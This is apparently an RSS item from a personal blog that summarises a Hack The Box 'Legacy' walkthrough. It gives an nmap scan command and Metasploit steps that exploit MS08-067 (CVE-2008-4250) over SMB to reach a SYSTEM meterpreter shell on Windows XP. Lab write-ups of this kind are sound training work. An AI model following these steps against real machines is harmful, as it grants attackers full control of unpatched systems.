channel.title: EternalBlue on AlrikRr's Blog

item.title: Legacy
item.description: Re-Post from October 2021, 13rd Enumeration nmap sudo nmap -v -sS -A -Pn legacy.htb Using nmap we can definitly see the NetBIOS protocol on the SMB port. This machine is a XP Legacy OS so we can maybe try some old exploit if the system is not patched. Exploit CVE-2008-4250 msfconsole search ms08_067 use 0 After the exploit the meterpreter gives us a SYSTEM shell, no need to privesc !
